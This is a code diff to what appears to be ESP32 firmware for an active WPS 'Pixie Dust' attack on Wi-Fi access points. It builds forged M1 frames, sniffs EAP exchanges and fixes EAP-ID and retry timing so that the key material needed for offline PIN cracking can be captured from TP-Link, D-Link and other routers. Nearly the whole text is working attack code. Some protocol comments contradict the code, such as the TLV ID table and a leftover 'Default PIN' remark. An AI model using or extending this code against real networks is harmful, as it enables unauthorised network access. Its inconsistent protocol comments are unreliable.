@@ -382,7 +382,7 @@ static int buildAssocFrame(uint8_t *buf, const uint8_t *apBssid,
         0x00,0x01,0x10,     // len=1, value=1.0
         0x10,0x12,          // attr: Device Password ID (0x1012)
         0x00,0x02,          // len=2
-        0x00,0x00,          // Default PIN (0x0000 per WPS spec Table E-6)
+        0x00,0x04,          // Device PIN (0x0004)
         0x10,0x3C,          // attr: RF Bands (0x103C)
         0x00,0x01,0x01,     // len=1, 2.4GHz
         0x10,0x49,          // attr: Vendor Extension
@@ -534,6 +534,8 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
     };
     uint8_t pke[192];
     memcpy(pke, valid_pke, 192);
+    for (int i = 0; i < 16; i++) pke[i] ^= (uint8_t)esp_random();
+    if (pke[0] == 0x00) pke[0] = 0x02; // DH key MSB must be non-zero
     memcpy(eNonceOut, eNonce,  16);
 
     // Fixed enrollee attributes (values don't need to be accurate for pixie)
@@ -547,17 +549,19 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
                                      enrolleeMac[2],enrolleeMac[3],
                                      enrolleeMac[4],enrolleeMac[5]};
     const uint8_t authTypeFlags[] = {0x00,0x22};      // WPA2-Personal + Open
-    const uint8_t encrTypeFlags[] = {0x00,0x0E};      // AES + TKIP + None
-    const uint8_t connTypeFlags[] = {0x01};            // ESS
+    const uint8_t encrTypeFlags[] = {0x00,0x0C};      // AES + TKIP (WPS 2.0: no None)
+    const uint8_t connTypeFlags[] = {0x00,0x01};       // ESS (2 bytes per spec)
     // configMethods=Label (0x0004) is fine; devPasswordId=Default PIN (0x0000).
     // Some APs NACK if configMethods advertises PushButton while devPasswordId=PIN.
     const uint8_t configMethods[] = {0x00,0x04};      // Label (PIN entry)
-    const uint8_t wifiProtected[] = {0x01};            // WPS
-    const uint8_t devPassId[]     = {0x00,0x00};       // Default PIN (0x0000 per WPS spec)
+    const uint8_t wifiProtected[] = {0x02};            // WPS State = Configured (0x02)
+    // NOTE: 0x01 = Unconfigured. Some APs refuse PIN enrollment to an
+    // "unconfigured" network. Always send 0x02 for Pixie Dust attacks.
+    const uint8_t devPassId[]     = {0x00,0x04};       // Device PIN (0x0004)
     const uint8_t osVersion[]     = {0xFF,0xFF,0xFF,0xFF}; // unspecified
     const uint8_t rfBands[]       = {0x01};             // 2.4GHz
     const uint8_t assocState[]    = {0x00,0x01};        // Not associated
-    const uint8_t devPasswordId[] = {0x00,0x00};        // Default PIN (0x0000)
+    const uint8_t devPasswordId[] = {0x00,0x04};        // Device PIN (0x0004)
     const uint8_t configError[]   = {0x00,0x00};        // No error
     const uint8_t osVendorExt[]   = {0x00,0x37,0x2A,0x00,0x01,0x20}; // WFA version2=2.0
     // Device name / manufacturer (short)
@@ -590,7 +594,7 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
     // Mandatory M1 TLVs in WPS spec order (Wi-Fi Simple Configuration 2.0)
     // TLV ID reference:
     //   0x104A Version           0x1022 Message Type    0x1047 UUID-E
-    //   0x1020 MAC Address       0x1032 Enrollee Nonce  0x1028 Enrollee Public Key
+    //   0x1020 MAC Address       0x1016 Enrollee Nonce  0x1032 Enrollee Public Key
     //   0x1010 Auth Type Flags   0x100D Encr Type Flags 0x100E Conn Type Flags
     //   0x1008 Config Methods    0x1044 WPS State       0x1012 Device Password ID
     //   0x103C RF Bands          0x1002 Assoc State     0x1009 Config Error
@@ -601,7 +605,7 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
     putTlv(0x1022, msgType,        sizeof(msgType));        // Message Type = M1
     putTlv(0x1047, uuid,           sizeof(uuid));           // UUID-E
     putTlv(0x1020, macAddr,        sizeof(macAddr));        // MAC Address
-    putTlv(0x101C, eNonce,         16);                     // Enrollee Nonce
+    putTlv(0x101C, eNonce,         16);                     // Enrollee Nonce (0x101C per Wi-Fi Simple Config 2.0 Table E-1)
     putTlv(0x1032, pke,            192);                    // Enrollee Public Key
     putTlv(0x1004, authTypeFlags,  sizeof(authTypeFlags));  // Auth Type Flags
     putTlv(0x100D, encrTypeFlags,  sizeof(encrTypeFlags));  // Encr Type Flags
@@ -697,11 +701,12 @@ enum class WpsProbeState : uint8_t {
 PixieData pixieCapture;
 
 // Internal state for the active probe
-static volatile WpsProbeState g_wpsState    = WpsProbeState::Idle;
-static volatile uint8_t       g_lastEapId   = 0;
-static volatile bool          g_gotAuthResp  = false;
-static volatile bool          g_gotAssocResp = false;
-static volatile bool          g_gotEapIdReq  = false;
+static volatile WpsProbeState g_wpsState       = WpsProbeState::Idle;
+static volatile uint8_t       g_identityReqId  = 0;  // FIX: capture FIRST EAP-Req/Identity id, protect from retransmits
+static volatile uint8_t       g_lastEapId      = 0;  // updated during M1/M2 phase, used for M1 id = lastEapId+1
+static volatile bool          g_gotAuthResp    = false;
+static volatile bool          g_gotAssocResp   = false;
+static volatile bool          g_gotEapIdReq    = false;
 
 // ============================================================
 // Promiscuous callback used during the active probe.
@@ -775,16 +780,22 @@ static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
             // EAP type is at offset+4 (after code, id, length×2)
             uint8_t eapType = (offset + 4 < len) ? p[offset + 4] : 0;
 
-            g_lastEapId = eapId;
-
             if (eapCode == 0x01) { // EAP-Request from AP
                 if (eapType == 0x01) {
-                    // EAP-Request/Identity
-                    if (!g_gotEapIdReq) Serial.println("[WPS-Probe] Got EAP-Req/Identity");
+                    // EAP-Request/Identity — update g_lastEapId on EVERY retransmit.
+                    // The AP increments its EAP ID on each retransmit. We must echo
+                    // back the LATEST id in our Identity Resp, not the first one seen.
+                    // g_identityReqId is kept for diagnostics only.
+                    if (!g_gotEapIdReq) {
+                        g_identityReqId = eapId;
+                        Serial.println("[WPS-Probe] Got EAP-Req/Identity");
+                    }
+                    g_lastEapId   = eapId;  // always track latest — used for Identity Resp
                     g_gotEapIdReq = true;
                 }
                 if (eapType == 0xFE) {
                     // EAP-Request/Expanded — detect WSC-Start.
+                    // Update g_lastEapId here so Identity-Resp doesn't clobber it
                     // This AP uses three outer Vendor-ID formats:
                     //   00:37:2A — standard WFA; Op at wsOffset+7
                     //   2A:00:01 — double-wrap; inner OUI 37:2A:00 at wsOffset+9,
@@ -820,13 +831,18 @@ static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
 
                     // Accept op=0x01 (WSC_Start) or op=0x04 (WSC_MSG, some APs skip Start)
                     if ((isStdWfa || isDblWrap || isShell || isTPLink) &&
-                        (opcode == 0x01 || opcode == 0x04) &&
-                        g_wpsState == WpsProbeState::IdentityRespSent) {
-                        Serial.printf("[WPS-Probe] WSC-Start (vid=%02X%02X%02X op=0x%02X%s)\n",
-                                      p[wsOffset], p[wsOffset+1], p[wsOffset+2], opcode,
-                                      isShell ? " shell" : isDblWrap ? " dbl-wrap" : "");
-                        g_lastEapId = eapId;
-                        g_wpsState  = WpsProbeState::WaitingM2;
+                        (opcode == 0x01 || opcode == 0x04)) {
+                        if (g_wpsState == WpsProbeState::IdentityRespSent) {
+                            Serial.printf("[WPS-Probe] WSC-Start (vid=%02X%02X%02X op=0x%02X%s)\n",
+                                          p[wsOffset], p[wsOffset+1], p[wsOffset+2], opcode,
+                                          isShell ? " shell" : isDblWrap ? " dbl-wrap" : "");
+                            g_lastEapId = eapId;
+                            g_wpsState  = WpsProbeState::WaitingM2;
+                        } else if (g_wpsState == WpsProbeState::WaitingM2) {
+                            // AP retransmitting WSC-Start — keep g_lastEapId current
+                            // so the M1 retry loop always patches the freshest id+1.
+                            g_lastEapId = eapId;
+                        }
                     }
                 }
             }
@@ -873,6 +889,20 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
         for (int i=0;i<5;i++) { esp_wifi_80211_tx(WIFI_IF_STA,f,26,true); vTaskDelay(pdMS_TO_TICKS(10)); }
         vTaskDelay(pdMS_TO_TICKS(400));
     }
+    // ── Reset all probe state FIRST, before re-enabling promiscuous mode. ──
+    // generateEnrolleeMac() calls set_promiscuous(true) which re-starts the
+    // sniffer callback. If the AP is already sending Identity-Req frames during
+    // the 400ms teardown delay, the callback will update g_lastEapId before the
+    // reset block below — causing Identity Resp to use a stale id from the
+    // previous attempt. Reset now, before any RX can arrive.
+    g_wpsState      = WpsProbeState::Idle;
+    g_identityReqId = 0;
+    g_lastEapId     = 0;
+    g_gotAuthResp   = false;
+    g_gotAssocResp  = false;
+    g_gotEapIdReq   = false;
+    wps_reassembly_reset();
+
     // generateEnrolleeMac() must disable promiscuous mode to apply the new MAC to hardware.
     // After re-enabling we MUST re-register the RX callback — on ESP-IDF,
     // esp_wifi_set_promiscuous(false) clears the callback, so without this call
@@ -894,11 +924,6 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     // Lock onto target channel
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     vTaskDelay(pdMS_TO_TICKS(50));
-
-    g_wpsState     = WpsProbeState::Idle;
-    g_gotAuthResp  = false;
-    g_gotAssocResp = false;
-    g_gotEapIdReq  = false;
 
     uint8_t frameBuf[300];
     int flen;
@@ -980,7 +1005,7 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     pixieCapture.pke_set = pixieCapture.e_nonce_set = true;
 
     // ---- EAP-Response/Identity ----
-    flen = buildEapIdentityResponse(frameBuf, bssid, g_lastEapId);
+    flen = buildEapIdentityResponse(frameBuf, bssid, g_lastEapId);  // g_lastEapId = latest Identity Req id
     g_wpsState = WpsProbeState::IdentityRespSent;
     for (int i = 0; i < 3; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
@@ -1003,34 +1028,39 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
         }
         Serial.printf("[WPS-Probe] WSC-Start received t=%lums\n", millis());
 
+        // Settle: wait 350ms after first WSC-Start before sending M1.
+        // The AP typically bursts 2-3 WSC-Start retransmits ~100ms apart.
+        // Each one updates g_lastEapId (via the WaitingM2 branch above).
+        // Waiting here ensures we capture the HIGHEST WSC-Start id so M1
+        // goes out with the correct id+1, not an id from an earlier retransmit.
+        // 350ms is enough for 3 retransmits at 100ms intervals without risking
+        // the AP's session timeout (~5s on TP-Link / D-Link).
+        vTaskDelay(pdMS_TO_TICKS(350));
+
         // Step 2: patch EAP ID in pre-built M1 and send.
         // WPS spec §7.1: after WSC-Start the enrollee sends M1 directly.
         // There is NO WSC-ACK step here — sending one causes the AP to
         // keep retransmitting WSC-Start and never process M1.
         //
-        // CRITICAL: M1 EAP ID must be WSC-Start EAP-ID + 1 (wrapping 0xFF→0x00).
-        // Reusing the WSC-Start ID causes the AP to treat M1 as a duplicate
-        // of WSC-Start and reply with WSC_NACK (Config Error 0x0006 / Msg Timeout).
-        // Byte 39 = EAP ID: 802.11hdr(26)+LLC/SNAP(8)+EAPOL(4)+EAP code(1) = 39
-        m1Frame[39] = (uint8_t)(g_lastEapId + 1); // +1, wraps 0xFF → 0x00
-        Serial.printf("[WPS-Probe] Sending M1 (EAP ID=0x%02X) t=%lums\n", g_lastEapId, millis());
-
-        // Send M1, then wait for M2 with periodic retransmits.
-        // Different vendors have very different EAP processing latency:
-        //   - Fast APs (ASUS, Netgear):          respond in ~100ms
-        //   - Medium APs (TP-Link):              respond in ~150-300ms
-        //   - Slow APs (D-Link, some Belkin):    can take 500ms-1s
-        // Strategy: send M1, wait M1_RETRY_INTERVAL ms; if no M2 yet,
-        // retransmit up to M1_MAX_RETRIES times before giving up.
-        // Using the same EAP ID on retransmits is correct — if the AP already
-        // processed it, the retransmit is a harmless duplicate it will ignore.
-        static const uint32_t M1_RETRY_INTERVAL_MS = 3000; // 3s per attempt
-        static const int      M1_MAX_RETRIES        = 3;   // 4 sends total = 12s window
+        // Send M1, wait for M2, retransmit if needed.
+        // Vendors vary widely: ASUS ~100ms, TP-Link ~150-300ms, D-Link up to 1s.
+        // Re-patching EAP ID before each send handles AP WSC-Start retransmits.
+        static const uint32_t M1_RETRY_INTERVAL_MS = 3000;
+        static const int      M1_MAX_RETRIES        = 3;   // 4 sends = 12s total
 
         bool gotM2 = false;
         for (int attempt = 0; attempt <= M1_MAX_RETRIES && !gotM2; attempt++) {
-            if (attempt > 0) {
-                Serial.printf("[WPS-Probe] M1 retransmit #%d t=%lums\n", attempt, millis());
+            // Re-patch EAP ID immediately before each send.
+            // The AP retransmits WSC-Start with incrementing IDs between our attempts.
+            // g_lastEapId is updated by the sniffer on every WSC-Start retransmit,
+            // so patching here ensures each M1 send uses the very latest id+1.
+            m1Frame[39] = (uint8_t)(g_lastEapId + 1);
+            if (attempt == 0) {
+                Serial.printf("[WPS-Probe] Sending M1 (EAP ID=0x%02X) t=%lums\n",
+                              m1Frame[39], millis());
+            } else {
+                Serial.printf("[WPS-Probe] M1 retransmit #%d (EAP ID=0x%02X) t=%lums\n",
+                              attempt, m1Frame[39], millis());
             }
             esp_wifi_80211_tx(WIFI_IF_STA, m1Frame, m1Len, true);
 
